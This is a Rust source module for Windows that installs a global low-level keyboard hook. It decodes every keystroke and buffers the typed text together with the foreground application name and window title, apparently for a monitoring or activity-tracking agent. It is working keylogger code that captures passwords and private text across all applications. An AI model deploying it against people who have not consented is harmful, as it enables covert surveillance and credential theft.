//! Keyboard capture with Unicode decoding, window-context buffering, and
//! AFK / active transition detection.
//!
//! ## Architecture
//!
//! ```text
//! ┌──────────────────────────────────────────────────────────────────┐
//! │ OS thread: "keyboard-hook"                                      │
//! │   SetWindowsHookExW(WH_KEYBOARD_LL)                             │
//! │   → decode keystroke (GetAsyncKeyState + ToUnicodeEx)           │
//! │   → std::sync::mpsc sync_channel (cap 512)                      │
//! └──────────────────────────────────────────────────────────────────┘
//!                  │
//!                  ▼
//! ┌──────────────────────────────────────────────────────────────────┐
//! │ OS thread: "keyboard-decoder"                                   │
//! │   Buffers decoded chars grouped by (app, window title).         │
//! │   Flushes on: window switch | 200-char limit | 5-s silence      │
//! │   → tokio::sync::mpsc::UnboundedSender<InputEvent>              │
//! └──────────────────────────────────────────────────────────────────┘
//!                  │
//!                  ▼
//! ┌──────────────────────────────────────────────────────────────────┐
//! │ Tokio task: AFK watcher                                          │
//! │   Polls GetLastInputInfo every 1 s.                             │
//! │   Emits Afk / Active events on idle transitions.                │
//! │   → same UnboundedSender<InputEvent>                            │
//! └──────────────────────────────────────────────────────────────────┘
//! ```
//!
//! Both the decoder thread and the AFK watcher share the same sender so
//! `main.rs` reads all key/idle events from a single receiver.

use std::cell::Cell;
use std::sync::OnceLock;
use tokio::sync::mpsc::Sender;
use windows::core::PWSTR;
use windows::Win32::Foundation::{CloseHandle, LPARAM, LRESULT, WPARAM};
use windows::Win32::System::Threading::{
    OpenProcess, QueryFullProcessImageNameW, PROCESS_NAME_FORMAT, PROCESS_QUERY_LIMITED_INFORMATION,
};
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetAsyncKeyState, GetKeyboardLayout, GetLastInputInfo, ToUnicodeEx, LASTINPUTINFO, VK_CAPITAL,
    VK_CONTROL, VK_MENU, VK_RMENU, VK_SHIFT,
};
use windows::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx, DispatchMessageW, GetForegroundWindow, GetMessageW, GetWindowTextW,
    GetWindowThreadProcessId, SetWindowsHookExW, TranslateMessage, UnhookWindowsHookEx, HHOOK,
    KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
};

// ─── Public types ─────────────────────────────────────────────────────────────

/// How long with no input before declaring the user AFK.
pub const AFK_THRESHOLD_SECS: u64 = 60;

/// Maximum buffered characters before a forced flush.
const FLUSH_CHARS: usize = 200;

/// Flush remaining buffer after this many seconds of keyboard silence.
const FLUSH_TIMEOUT_SECS: u64 = 5;

/// An event produced by the keyboard capture subsystem.
#[derive(Debug, Clone)]
pub enum InputEvent {
    /// A decoded burst of keystrokes associated with a specific window.
    Keys {
        /// Unicode text (printable chars + special-key labels like `[⌫]`).
        text: String,
        /// Executable basename, e.g. `"chrome.exe"`.
        app: String,
        /// Friendly executable name derived from file metadata.
        /// Example: `"Microsoft Edge"`.
        app_display: String,
        /// Window title at the time of typing.
        window: String,
        /// UNIX timestamp (seconds).
        ts: u64,
    },
    /// User has been idle for at least `idle_secs` seconds.
    Afk { idle_secs: u64 },
    /// User resumed input after an AFK period.
    Active,
}

// ─── Global hook channel ──────────────────────────────────────────────────────

/// Sends decoded keystrokes from the hook callback to the decoder thread.
/// `OnceLock` so it is safe to access from the `extern "system"` callback.
static HOOK_TX: OnceLock<std::sync::mpsc::SyncSender<String>> = OnceLock::new();

thread_local! {
    /// Same thread as [`SetWindowsHookExW`] / hook callback; [`HHOOK`] is not `Sync` for a `static`.
    static HOOK_TLS: Cell<Option<HHOOK>> = const { Cell::new(None) };
}

// ─── Hook callback ────────────────────────────────────────────────────────────

unsafe extern "system" fn hook_proc(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 {
        let msg = wparam.0 as u32;
        if msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN {
            let kbd = &*(lparam.0 as *const KBDLLHOOKSTRUCT);
            let decoded = decode_key(kbd.vkCode, kbd.scanCode);
            if !decoded.is_empty() {
                if let Some(tx) = HOOK_TX.get() {
                    // try_send: drop the event rather than block the hook (never stall input).
                    let _ = tx.try_send(decoded);
                }
            }
        }
    }
    CallNextHookEx(HOOK_TLS.with(std::cell::Cell::get), code, wparam, lparam)
}

// ─── Key decoder ──────────────────────────────────────────────────────────────

/// Translate a virtual-key code + scan code into a loggable string.
///
/// Returns an empty string for keys we deliberately skip (arrows, Fn keys,
/// pure Ctrl combos like Ctrl-C that don't produce printable output).
unsafe fn decode_key(vk: u32, scan: u32) -> String {
    // ── Special keys with explicit labels ────────────────────────────────
    match vk {
        0x0D => return "\n".into(),         // Enter — store as real newline
        0x08 => return "[⌫]".into(),        // Backspace
        0x09 => return "[⇥]".into(),        // Tab
        0x1B => return "[Esc]".into(),      // Escape
        0x2E => return "[Del]".into(),      // Delete
        0x20 => return " ".into(),          // Space
        0x5B | 0x5C => return "[⊞]".into(), // Left / Right Win
        // Keys we don't care to log
        0x25..=0x28 => return String::new(), // Arrow keys
        0x70..=0x87 => return String::new(), // F1-F24
        0x2C => return String::new(),        // Print Screen
        0x91 | 0x13 => return String::new(), // Scroll Lock, Pause
        _ => {}
    }

    // ── Suppress pure Ctrl shortcuts (Ctrl+C, Ctrl+V, etc.) ──────────────
    // AltGr is encoded as Ctrl+RightAlt; allow that through.
    let ctrl = (GetAsyncKeyState(i32::from(VK_CONTROL.0)) as u16) >> 15 != 0;
    let altgr = (GetAsyncKeyState(i32::from(VK_RMENU.0)) as u16) >> 15 != 0;
    if ctrl && !altgr {
        return String::new();
    }

    // ── Build keyboard state for ToUnicodeEx ─────────────────────────────
    let mut ks = [0u8; 256];

    // Shift
    if (GetAsyncKeyState(i32::from(VK_SHIFT.0)) as u16) >> 15 != 0 {
        ks[VK_SHIFT.0 as usize] = 0x80;
    }
    // CapsLock — toggle state lives in low bit
    if (GetAsyncKeyState(i32::from(VK_CAPITAL.0)) as u16) & 1 != 0 {
        ks[VK_CAPITAL.0 as usize] = 0x01;
    }
    // AltGr (Right Alt) = Ctrl + Alt for ToUnicode
    if altgr {
        ks[VK_CONTROL.0 as usize] = 0x80;
        ks[VK_MENU.0 as usize] = 0x80;
        ks[VK_RMENU.0 as usize] = 0x80;
    }

    let mut buf = [0u16; 4];
    let layout = GetKeyboardLayout(0);
    let n = ToUnicodeEx(vk, scan, &ks, &mut buf, 0, Some(layout));

    if n > 0 {
        let s: String = String::from_utf16_lossy(&buf[..n as usize])
            .chars()
            .filter(|c| !c.is_control()) // strip residual control chars
            .collect();
        if !s.is_empty() {
            return s;
        }
    }

    String::new()
}

// ─── Public entry point ───────────────────────────────────────────────────────

/// Install the keyboard hook and start background threads / tasks.
///
/// All [`InputEvent`]s (keystrokes + AFK transitions) are delivered on
/// `out_tx`. The hook remains active for the lifetime of the process.
pub fn start(out_tx: Sender<InputEvent>) -> anyhow::Result<()> {
    let (raw_tx, raw_rx) = std::sync::mpsc::sync_channel::<String>(512);
    HOOK_TX
        .set(raw_tx)
        .map_err(|_| anyhow::anyhow!("Keyboard capture already started"))?;

    // ── Hook thread: message pump required on the same thread as SetWindowsHookExW ──
    // The thread reports whether the hook installed so `start()` can degrade (continue without
    // keystroke capture) instead of panicking — `panic = "abort"` would otherwise kill the agent.
    let (install_tx, install_rx) = std::sync::mpsc::channel::<Result<(), String>>();
    std::thread::Builder::new()
        .name("keyboard-hook".into())
        .spawn(move || unsafe {
            let hook = match SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), None, 0) {
                Ok(h) => h,
                Err(e) => {
                    let _ = install_tx.send(Err(format!("SetWindowsHookExW failed: {e}")));
                    return;
                }
            };
            HOOK_TLS.with(|c| c.set(Some(hook)));
            let _ = install_tx.send(Ok(()));

            let mut msg = MSG::default();
            while GetMessageW(&raw mut msg, None, 0, 0).as_bool() {
                let _ = TranslateMessage(&raw const msg);
                DispatchMessageW(&raw const msg);
            }
            HOOK_TLS.with(|c| {
                if let Some(hk) = c.take() {
                    let _ = UnhookWindowsHookEx(hk);
                }
            });
        })?;

    // Wait for the hook thread to report its install result before deciding whether capture is live.
    let install_result = install_rx
        .recv()
        .unwrap_or_else(|_| Err("keyboard hook thread exited before reporting".to_string()));

    // ── AFK watcher: Tokio async task (works via GetLastInputInfo, independent of the hook) ──
    tokio::spawn(run_afk_watcher(out_tx.clone()));

    match install_result {
        Ok(()) => {
            // ── Decoder thread: buffer and flush by window context ────────────────
            std::thread::Builder::new()
                .name("keyboard-decoder".into())
                .spawn(move || run_decoder(raw_rx, out_tx))?;
            Ok(())
        }
        // Degraded: no keystroke capture, but AFK tracking continues. Surface the error to the
        // caller, which logs it and keeps the agent running.
        Err(e) => Err(anyhow::anyhow!(e)),
    }
}

// ─── Decoder thread ───────────────────────────────────────────────────────────

fn run_decoder(raw_rx: std::sync::mpsc::Receiver<String>, out_tx: Sender<InputEvent>) {
    use std::time::{Duration, Instant};

    let mut buf = String::new();
    let mut cur_app = String::new();
    let mut cur_app_display = String::new();
    let mut cur_win = String::new();
    let timeout = Duration::from_secs(FLUSH_TIMEOUT_SECS);
    let mut last_key = Instant::now();

    loop {
        match raw_rx.recv_timeout(timeout) {
            Ok(ch) => {
                last_key = Instant::now();
                let (app, app_display, win) = foreground_window_info();

                // Window context changed → flush previous buffer first.
                if !buf.is_empty() && (app != cur_app || win != cur_win) {
                    emit(&buf, &cur_app, &cur_app_display, &cur_win, &out_tx);
                    buf.clear();
                }
                cur_app = app;
                cur_app_display = app_display;
                cur_win = win;

                buf.push_str(&ch);

                // Flush when the buffer is large enough.
                if buf.len() >= FLUSH_CHARS {
                    emit(&buf, &cur_app, &cur_app_display, &cur_win, &out_tx);
                    buf.clear();
                }
            }

            // 5-second silence: flush what we have so keys appear promptly.
            Err(std::sync::mpsc::RecvTimeoutError::Timeout) => {
                if !buf.is_empty() && last_key.elapsed() >= timeout {
                    emit(&buf, &cur_app, &cur_app_display, &cur_win, &out_tx);
                    buf.clear();
                }
            }

            Err(std::sync::mpsc::RecvTimeoutError::Disconnected) => break,
        }
    }
}

fn emit(text: &str, app: &str, app_display: &str, win: &str, tx: &Sender<InputEvent>) {
    // Best-effort: never block input threads. If the queue is full, drop the burst.
    let _ = tx.try_send(InputEvent::Keys {
        text: text.to_owned(),
        app: app.to_owned(),
        app_display: app_display.to_owned(),
        window: win.to_owned(),
        ts: unix_ts(),
    });
}

// ─── AFK watcher ─────────────────────────────────────────────────────────────

/// Polls `GetLastInputInfo` every second.
///
/// Detects idle → active and active → idle transitions without needing
/// `GetTickCount` — just compares the `dwTime` tick for changes.
async fn run_afk_watcher(out_tx: Sender<InputEvent>) {
    use std::time::Instant;
    use tokio::time::{interval, Duration, MissedTickBehavior};

    let mut ticker = interval(Duration::from_secs(1));
    ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);

    let mut was_afk = false;
    let mut last_input_tick = 0u32;
    let mut last_input_mono = Instant::now();

    loop {
        ticker.tick().await;

        let dw_time = unsafe {
            let mut lii = LASTINPUTINFO {
                cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
                dwTime: 0,
            };
            let _ = GetLastInputInfo(&raw mut lii);
            lii.dwTime
        };

        if dw_time == last_input_tick {
            let idle_secs = last_input_mono.elapsed().as_secs();
            if idle_secs >= AFK_THRESHOLD_SECS && !was_afk {
                was_afk = true;
                let _ = out_tx.try_send(InputEvent::Afk { idle_secs });
            }
        } else {
            // Any input (keyboard or mouse) resets the idle clock.
            last_input_tick = dw_time;
            last_input_mono = Instant::now();

            if was_afk {
                was_afk = false;
                let _ = out_tx.try_send(InputEvent::Active);
            }
        }
    }
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

/// Return `(exe_basename, app_display_name, window_title)` for the current
/// foreground window.
fn foreground_window_info() -> (String, String, String) {
    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.0.is_null() {
            return (String::new(), String::new(), String::new());
        }

        // Title
        let mut title_buf = [0u16; 512];
        let title_len = GetWindowTextW(hwnd, &mut title_buf) as usize;
        let title = String::from_utf16_lossy(&title_buf[..title_len]);

        // PID → process image name
        let mut pid = 0u32;
        GetWindowThreadProcessId(hwnd, Some(&raw mut pid));
        let (app, app_display) = if pid != 0 {
            match OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) {
                Ok(handle) => {
                    let mut buf = [0u16; 1024];
                    let mut size = buf.len() as u32;
                    let ok = QueryFullProcessImageNameW(
                        handle,
                        PROCESS_NAME_FORMAT(0),
                        PWSTR(buf.as_mut_ptr()),
                        &raw mut size,
                    );
                    let _ = CloseHandle(handle);
                    if ok.is_ok() {
                        let full_path = String::from_utf16_lossy(&buf[..size as usize]);
                        let app = full_path
                            .rsplit(['\\', '/'])
                            .next()
                            .unwrap_or("")
                            .to_string();
                        let app_display =
                            crate::app_display::app_display_name_from_full_path(&full_path);
                        (app, app_display)
                    } else {
                        (String::new(), String::new())
                    }
                }
                Err(_) => (String::new(), String::new()),
            }
        } else {
            (String::new(), String::new())
        };

        (app, app_display, title)
    }
}

#[inline]
fn unix_ts() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}
